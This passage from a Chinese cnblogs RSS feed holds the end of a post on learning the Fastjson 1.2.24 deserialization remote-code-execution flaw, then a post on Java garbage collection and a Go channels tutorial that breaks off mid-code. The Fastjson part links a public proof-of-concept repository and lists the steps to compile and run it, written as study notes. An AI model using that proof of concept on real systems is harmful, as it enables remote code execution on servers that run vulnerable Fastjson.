&lt;p&gt;从github上直接pull下poc：https://github.com/shengqi158/fastjson-remote-code-execute-poc。使用idea打开工程，编译test.java：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231608509-1666131704.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后会在target/classes/person下生成test.class文件。用同样的方法编译Poc.java。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231612546-1146123517.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;配置运行方式&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231615673-1622918376.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231619219-1450843927.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;运行Poc：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231633665-1784594823.png&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1077935/201811/1077935-20181119231636589-180318193.png&quot;/&gt;&lt;/p&gt;
&lt;h2 id=&quot;x03-参考文章&quot;&gt;0x03 参考文章&lt;/h2&gt;
&lt;blockquote readability=&quot;0.27272727272727&quot;&gt;
&lt;p&gt;1.&lt;a href=&quot;http://xxlegend.com/2017/05/03/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/&quot;&gt;廖新喜 fastjson 远程反序列化poc的构造和分析&lt;/a&gt;&lt;br/&gt;2.&lt;a href=&quot;https://www.freebuf.com/vuls/178012.html&quot;&gt;Freebuf Fastjson 1.2.24反序列化漏洞分析&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
<pubDate>Mon, 19 Nov 2018 15:05:00 +0000</pubDate>
<dc:creator>ka1n4t</dc:creator>
<og:description>最近在学习Java安全，感觉反序列化很牛皮，所以就来学习一哈。我Java水平不咋地，文章如果有错请指正。 开始 0x00 简单介绍 介绍：FastJson是一款由阿里开发的JSON库 影响版本：1.2</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/litlife/p/9986427.html</dc:identifier>
</item>
<item>
<title>一篇文章让你了解GC垃圾回收器 - 彳亍风</title>
<link>http://www.cnblogs.com/lmqblogs/p/9986403.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lmqblogs/p/9986403.html</guid>
<description>&lt;p class=&quot;15&quot;&gt;&lt;span&gt;了解GC之前我们首先要了解GC是要做什么的？顾名思义回收垃圾，什么是垃圾呢？&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;GC回收的垃圾主要指的是回收堆内存中的垃圾对象。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;从根对象出发，所有被引用的对象，都是存活对象&lt;/span&gt;&lt;span&gt; 其他对象，都是垃圾对象。&lt;/span&gt;&lt;/p&gt;
&lt;h2 class=&quot;15&quot;&gt;&lt;span&gt; 根对象：&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 栈中的引用变量，所引用的对象。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　方法区经静态变量所引用的对象。&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;&lt;span&gt; GC回收的三种基本方式&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;一、&lt;span&gt;标记&lt;/span&gt;-&lt;span&gt;清除&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　标记存活对象，清理其他垃圾对象（阴影为存活对象，空白为垃圾对象）&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　优点：效率高&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　缺点：产生碎片，使内存分布碎片化，造成内存空间不连续。若出现大的对象，内存空间不连续则难以存取&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1527105/201811/1527105-20181119222217837-896370043.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;strong&gt;二、&lt;span&gt;标记&lt;/span&gt;-&lt;span&gt;整理&lt;/span&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　标记存活对象，清除垃圾对象，对垃圾对象进行整理 &lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　优点：没有碎片&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 缺点：效率低&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1527105/201811/1527105-20181119222436798-1266001029.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;三、复制&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;　&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;　在内存中分配两块内存，将标记的存活对象复制到另一块内存当中，&lt;/span&gt;&lt;span&gt;&lt;br/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　再将原内存的对象清除。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　优点：效率高&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　缺点：浪费内存&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;img src=&quot;https://img2018.cnblogs.com/blog/1527105/201811/1527105-20181119222526767-1950256952.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 class=&quot;15&quot;&gt;&lt;span&gt; 内存分区&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　新生代&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　老年代&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　永久代（方法区）（在Java8中，永久代已经被移除，被一个称为“元数据区”（元空间）的区域所取代）&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;/span&gt;&lt;/p&gt;
&lt;h3 class=&quot;15&quot;&gt;&lt;span&gt;新生代&lt;/span&gt;&lt;/h3&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　主要是用来存放新生的对象。一般占据堆的1/3空间。由于频繁创建对象，所以新生代会频繁触发MinorGC进行垃圾回收&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 新生代又分为伊甸园与生存区，生存区分为ServivorFrom、ServivorTo&lt;/span&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;span&gt;Eden区（伊甸园）：Java新对象的出生地（如果新创建的对象占用内存很大，则直接分配到老年代）。当Eden区内存不够的时候就会触发MinorGC，对新生代区进行一次垃圾回收。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;ServivorTo：保留了一次MinorGC过程中的幸存者。&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;ServivorFrom：上一次GC的幸存者，作为这一次GC的被扫描者。&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;过程：&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 新建对象，在伊甸园分配内存&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; &lt;span&gt;伊甸园存满，复制到&lt;/span&gt;from&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; from&lt;span&gt;存满，复制到&lt;/span&gt;&lt;span&gt;t&lt;/span&gt;o，并交换角色&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; &lt;span&gt;对象在&lt;/span&gt;from&lt;span&gt;，&lt;/span&gt;to&lt;span&gt;之间复制&lt;/span&gt;&lt;span&gt;1&lt;/span&gt;5次，晋升到老年代&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt; &lt;img src=&quot;https://img2018.cnblogs.com/blog/1527105/201811/1527105-20181119223519416-1959605257.png&quot; alt=&quot;&quot;/&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;老年代&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 &lt;span&gt;标记&lt;/span&gt;-&lt;span&gt;清除、标记&lt;/span&gt;&lt;span&gt;-&lt;/span&gt;&lt;span&gt;整理&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　间隔一段时间，会执行一次小范围垃圾回收&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　&lt;span&gt;当老年代空间占用到一定比例&lt;/span&gt; 0.85&lt;span&gt;，会执行&lt;/span&gt;full-gc&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 当老年代也满了装不下的时候，就会抛出OOM（Out of Memory）异常。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;strong&gt;常见的垃圾回收器&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;ol&gt;&lt;li&gt;&lt;span&gt;串行垃圾回收器（Serial Garbage Collector）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;并行垃圾回收器（Parallel Garbage Collector）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;并发标记扫描垃圾回收器（CMS Garbage Collector）&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span&gt;G1垃圾回收器（G1 Garbage Collector）&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;span&gt;了解主要的两种（CMS，G1）&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;CMS - &lt;span&gt;并发的标记&lt;/span&gt;-&lt;span&gt;清除&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;strong&gt;&lt;span&gt;&lt;span&gt;　　&lt;/span&gt;&lt;/span&gt;&lt;/strong&gt;&lt;span&gt;STW(Stop The World)时间非常短暂&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;span&gt;　　初始标记&lt;/span&gt;(stw)&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　只标记根对象&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　并发标记&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;span&gt;　　垃圾回收器，与其他&lt;/span&gt;java程序并行执行&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;span&gt;　　重新标记&lt;/span&gt;(stw)&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　并发清除&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;span&gt;　　与其他&lt;/span&gt;java程序并行执行，&lt;/span&gt;&lt;span&gt;配置参数过多，使用过于复杂&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;总结：&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　&lt;/span&gt;&lt;span&gt;是一种以获得最短回收停顿时间为目标的收集器，基于标记清除算法。&lt;/span&gt;&lt;span&gt;过程如下：初始标记，并发标记，重新标记，并发清除，&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　优点是并发收集，低停顿，缺点是对CPU资源非常敏感，无法处理浮动垃圾，收集结束会产生大量空间碎片。&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;&lt;strong&gt;G1 - Garbage First&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　内存被划分成几千个内存块&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 有伊甸园、生存区、老年代&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 用复制算法&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　 G1会找到垃圾最多的内存块，优先回收&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt; 　　&lt;span&gt;配置参数非常简单，只需要配置目标停顿时间&lt;/span&gt;(stw)&lt;span&gt;，&lt;/span&gt;G1自动调整其他参数，来达到预期的停顿时间&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;总结：G1垃圾回收器适用于堆内存很大的情况，他将堆内存分割成不同的区域，并且并发的对其进行垃圾回收。&lt;/span&gt;&lt;span&gt;G1也可以在回收内存之后对剩余的&lt;/span&gt;&lt;/p&gt;
&lt;p class=&quot;15&quot;&gt;&lt;span&gt;　　　堆内存空间进行压缩。&lt;/span&gt;&lt;span&gt;并发扫描标记垃圾回收器在STW情况下压缩内存。G1垃圾回收会优先选择第一块垃圾最多的区域&lt;/span&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 19 Nov 2018 15:01:00 +0000</pubDate>
<dc:creator>彳亍风</dc:creator>
<og:description>简单了解GC垃圾回收器 了解GC之前我们首先要了解GC是要做什么的？顾名思义回收垃圾，什么是垃圾呢？ GC回收的垃圾主要指的是回收堆内存中的垃圾对象。 从根对象出发，所有被引用的对象，都是存活对象</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/lmqblogs/p/9986403.html</dc:identifier>
</item>
<item>
<title>Go基础系列：channel入门 - 骏马金龙</title>
<link>http://www.cnblogs.com/f-ck-need-u/p/9986335.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/f-ck-need-u/p/9986335.html</guid>
<description>&lt;h2 id=&quot;channel基础&quot;&gt;channel基础&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;channel用于goroutines之间的通信，让它们之间可以进行数据交换。像管道一样，一个goroutine_A向channel_A中放数据，另一个goroutine_B从channel_A取数据&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;channel是指针类型的数据类型，通过make来分配内存。例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ch := make(chan int)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这表示创建一个channel，这个channel中只能保存int类型的数据。也就是说一端只能向此channel中放进int类型的值，另一端只能从此channel中读出int类型的值。&lt;/p&gt;
&lt;p&gt;需要注意，&lt;code&gt;chan TYPE&lt;/code&gt;才表示channel的类型。所以其作为参数或返回值时，需指定为&lt;code&gt;xxx chan int&lt;/code&gt;类似的格式。&lt;/p&gt;
&lt;p&gt;向ch这个channel放数据的操作形式为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;ch &amp;lt;- VALUE&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;从ch这个channel读数据的操作形式为：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;&amp;lt;-ch             // 从ch中读取一个值
val = &amp;lt;-ch
val := &amp;lt;-ch      // 从ch中读取一个值并保存到val变量中
val,ok = &amp;lt;-ch    // 从ch读取一个值，判断是否读取成功，如果成功则保存到val变量中&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实很简单，当ch出现在&lt;code&gt;&amp;lt;-&lt;/code&gt;的左边表示send，当ch出现在&lt;code&gt;&amp;lt;-&lt;/code&gt;的右边表示recv。&lt;/p&gt;
&lt;p&gt;例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
    &quot;time&quot;
)

func main() {
    ch := make(chan string)
    go sender(ch)         // sender goroutine
    go recver(ch)         // recver goroutine
    time.Sleep(1e9)
}

func sender(ch chan string) {
    ch &amp;lt;- &quot;malongshuai&quot;
    ch &amp;lt;- &quot;gaoxiaofang&quot;
    ch &amp;lt;- &quot;wugui&quot;
    ch &amp;lt;- &quot;tuner&quot;
}

func recver(ch chan string) {
    var recv string
    for {
        recv = &amp;lt;-ch
        fmt.Println(recv)
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;malongshuai
gaoxiaofang
wugui
tuner&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面激活了一个goroutine用于执行sender()函数，该函数每次向channel ch中发送一个字符串。同时还激活了另一个goroutine用于执行recver()函数，该函数每次从channel ch中读取一个字符串。&lt;/p&gt;
&lt;p&gt;注意上面的&lt;code&gt;recv = &amp;lt;-ch&lt;/code&gt;，当channel中没有数据可读时，recver goroutine将会阻塞在此行。由于recver中读取channel的操作放在了无限for循环中，表示recver goroutine将一直阻塞，直到从channel ch中读取到数据，读取到数据后进入下一轮循环由被阻塞在&lt;code&gt;recv = &amp;lt;-ch&lt;/code&gt;上。直到main中的time.Sleep()指定的时间到了，main程序终止，所有的goroutine将全部被强制终止。&lt;/p&gt;
&lt;p&gt;因为receiver要不断从channel中读取可能存在的数据，所以&lt;strong&gt;receiver一般都使用一个无限循环来读取channel&lt;/strong&gt;，避免sender发送的数据被丢弃。&lt;/p&gt;

&lt;h2 id=&quot;channel的属性和分类&quot;&gt;channel的属性和分类&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;每个channel都有3种操作：send、receive和close&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;send：表示sender端的goroutine向channel中投放数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;receive：表示receiver端的goroutine从channel中读取数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;close：表示关闭channel
&lt;ul&gt;&lt;li&gt;关闭channel后，send操作将导致painc&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关闭channel后，recv操作将返回对应类型的0值以及一个状态码false&lt;/strong&gt;&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;close并非强制需要使用close(ch)来关闭channel，在某些时候可以自动被关闭&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;如果使用close()，建议条件允许的情况下加上defer&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;只在sender端上显式使用close()关闭channel。因为关闭通道意味着没有数据再需要发送&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;例如，判断channel是否被关闭：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;val, ok := &amp;lt;-counter
if ok {
    fmt.Println(val)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;channel分为两种：unbuffered channel和buffered channel&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;unbuffered channel：阻塞、同步模式
&lt;ul&gt;&lt;li&gt;sender端向channel中send一个数据，然后阻塞，直到receiver端将此数据receive&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;receiver端一直阻塞，直到sender端向channel发送了一个数据&lt;br/&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;buffered channel：非阻塞、异步模式
&lt;ul&gt;&lt;li&gt;sender端可以向channel中send多个数据(只要channel容量未满)，容量满之前不会阻塞&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;receiver端按照队列的方式(FIFO,先进先出)从buffered channel中按序receive其中数据&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;strong&gt;buffered channel有两个属性：容量和长度&lt;/strong&gt;：和slice的capacity和length的概念是一样的&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;capacity：表示bufffered channel最多可以缓冲多少个数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;length：表示buffered channel当前已缓冲多少个数据&lt;br/&gt;&lt;/li&gt;
&lt;li&gt;创建buffered channel的方式为&lt;code&gt;make(chan TYPE,CAP)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;unbuffered channel可以认为是容量为0的buffered channel，所以每发送一个数据就被阻塞。注意，不是容量为1的buffered channel，因为容量为1的channel，是在channel中已有一个数据，并发送第二个数据的时候才被阻塞。&lt;/p&gt;
&lt;p&gt;换句话说，send被阻塞的时候，其实是没有发送成功的，只有被另一端读走一个数据之后才算是send成功。对于unbuffered channel来说，这是send/recv的同步模式。&lt;/p&gt;
&lt;p&gt;实际上，当向一个channel进行send的时候，先关闭了channel，再读取channel时会发现错误在send，而不是recv。它会提示向已经关闭了的channel发送数据。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;func main() {
    counter := make(chan int)
    go func() {
        counter &amp;lt;- 32
    }()
    close(counter)
    fmt.Println(&amp;lt;-counter)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;输出报错：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;panic: send on closed channel&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;所以，在Go的内部行为中，send和recv是一个整体行为，数据未读就表示未send成功&lt;/strong&gt;。&lt;/p&gt;

&lt;h2 id=&quot;死锁deadlock&quot;&gt;死锁(deadlock)&lt;/h2&gt;
&lt;p&gt;当channel的某一端(sender/receiver)期待另一端的(receiver/sender)操作，另一端正好在期待本端的操作时，也就是说两端都因为对方而使得自己当前处于阻塞状态，这时将会出现死锁问题。&lt;/p&gt;
&lt;p&gt;比如，在main函数中，它有一个默认的goroutine，如果在此goroutine中创建一个unbuffered channel，并在main goroutine中向此channel中发送数据并直接receive数据，将会出现死锁：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main 

import (
    &quot;fmt&quot;
)

func main (){
    goo(32)
}

func goo(s int) {
    counter := make(chan int)
    counter &amp;lt;- s
    fmt.Println(&amp;lt;-counter)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在上面的示例中，向unbuffered channel中send数据的操作&lt;code&gt;counter &amp;lt;- s&lt;/code&gt;是在main goroutine中进行的，从此channel中recv的操作&lt;code&gt;&amp;lt;-counter&lt;/code&gt;也是在main goroutine中进行的。send的时候会直接阻塞main goroutine，使得recv操作无法被执行，go将探测到此问题，并报错：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;fatal error: all goroutines are asleep - deadlock!
goroutine 1 [chan send]:&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;要修复此问题，只需将send操作放在另一个goroutine中执行即可：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
)

func main() {
    goo(32)
}

func goo(s int) {
    counter := make(chan int)
    go func() {
        counter &amp;lt;- s
    }()
    fmt.Println(&amp;lt;-counter)
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;或者，将counter设置为一个容量为1的buffered channel：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;counter := make(chan int,1)&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;这样放完一个数据后send不会阻塞(被recv之前放第二个数据才会阻塞)，可以执行到recv操作。&lt;/p&gt;

&lt;h2 id=&quot;unbuffered-channel同步通信示例&quot;&gt;unbuffered channel同步通信示例&lt;/h2&gt;
&lt;p&gt;下面通过sync.WaitGroup类型来等待程序的结束，分析多个goroutine之间通信时状态的转换。因为创建的channel是unbuffered类型的，所以send和recv都是阻塞的。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
    &quot;sync&quot;
)

// wg用于等待程序执行完成
var wg sync.WaitGroup

func main() {
    count := make(chan int)

    // 增加两个待等待的goroutines
    wg.Add(2)
    fmt.Println(&quot;Start Goroutines&quot;)

    // 激活一个goroutine，label：&quot;Goroutine-1&quot;
    go printCounts(&quot;Goroutine-1&quot;, count)
    // 激活另一个goroutine，label：&quot;Goroutine-2&quot;
    go printCounts(&quot;Goroutine-2&quot;, count)

    fmt.Println(&quot;Communication of channel begins&quot;)
    // 向channel中发送初始数据
    count &amp;lt;- 1

    // 等待goroutines都执行完成
    fmt.Println(&quot;Waiting To Finish&quot;)
    wg.Wait()
    fmt.Println(&quot;\nTerminating the Program&quot;)
}
func printCounts(label string, count chan int) {
    // goroutine执行完成时，wg的计数器减1
    defer wg.Done()
    for {
        // 从channel中接收数据
        // 如果无数据可recv，则goroutine阻塞在此
        val, ok := &amp;lt;-count
        if !ok {
            fmt.Println(&quot;Channel was closed:&quot;,label)
            return
        }
        fmt.Printf(&quot;Count: %d received from %s \n&quot;, val, label)
        if val == 10 {
            fmt.Printf(&quot;Channel Closed from %s \n&quot;, label)
            // Close the channel
            close(count)
            return
        }
        // 输出接收到的数据后，加1，并重新将其send到channel中
        val++
        count &amp;lt;- val
    }
}&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的程序中，激活了两个goroutine，激活这两个goroutine后，向channel中发送一个初始数据值1，然后main goroutine将因为wg.Wait()等待2个goroutine都执行完成而被阻塞。&lt;/p&gt;
&lt;p&gt;再看这两个goroutine，这两个goroutine执行完全一样的函数代码，它们都接收count这个channel的数据，但可能是goroutine1先接收到channel中的初始值1，也可能是goroutine2先接收到初始值1。接收到数据后输出值，并在输出后对数据加1，然后将加1后的数据再次send到channel，每次send都会将自己这个goroutine阻塞(因为unbuffered channel)，此时另一个goroutine因为等待recv而执行。当加1后发送给channel的数据为10之后，某goroutine将关闭count channel，该goroutine将退出，wg的计数器减1，另一个goroutine因等待recv而阻塞的状态将因为channel的关闭而失败，ok状态码将让该goroutine退出，于是wg的计数器减为0，main goroutine因为wg.Wait()而继续执行后面的代码。&lt;/p&gt;

&lt;h2 id=&quot;使用for-range迭代channel&quot;&gt;使用for range迭代channel&lt;/h2&gt;
&lt;p&gt;前面都是在for无限循环中读取channel中的数据，但也可以使用range来迭代channel，它会返回每次迭代过程中所读取的数据，直到channel被关闭。&lt;/p&gt;
&lt;p&gt;例如，将上面示例中的printCounts()改为for-range的循环形式。&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;func printCounts(label string, count chan int) {
    defer wg.Done()
    for val := range count {
        fmt.Printf(&quot;Count: %d received from %s \n&quot;, val, label)
        if val == 10 {
            fmt.Printf(&quot;Channel Closed from %s \n&quot;, label)
            close(count)
            return
        }
        val++
        count &amp;lt;- val
    }
}&lt;/code&gt;
&lt;/pre&gt;

&lt;h2 id=&quot;多个管道输出作为输入&quot;&gt;多个&quot;管道&quot;：输出作为输入&lt;/h2&gt;
&lt;p&gt;channel是goroutine与goroutine之间通信的基础，一边产生数据放进channel，另一边从channel读取放进来的数据。可以借此实现多个goroutine之间的数据交换，例如&lt;code&gt;goroutine_1-&amp;gt;goroutine_2-&amp;gt;goroutine_3&lt;/code&gt;，就像bash的管道一样，上一个命令的输出可以不断传递给下一个命令的输入，只不过golang借助channel可以在多个goroutine(如函数的执行)之间传，而bash是在命令之间传。&lt;/p&gt;
&lt;p&gt;以下是一个示例，第一个函数getRandNum()用于生成随机整数，并将生成的整数放进第一个channel ch1中，第二个函数addRandNum()用于接收ch1中的数据(来自第一个函数)，将其输出，然后对接收的值加1后放进第二个channel ch2中，第三个函数printRes接收ch2中的数据并将其输出。&lt;/p&gt;
&lt;p&gt;如果将函数认为是Linux的命令，则类似于下面的命令行：ch1相当于第一个管道，ch2相当于第二个管道&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;getRandNum | addRandNum | printRes&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;以下是代码部分：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;package main

import (
    &quot;fmt&quot;
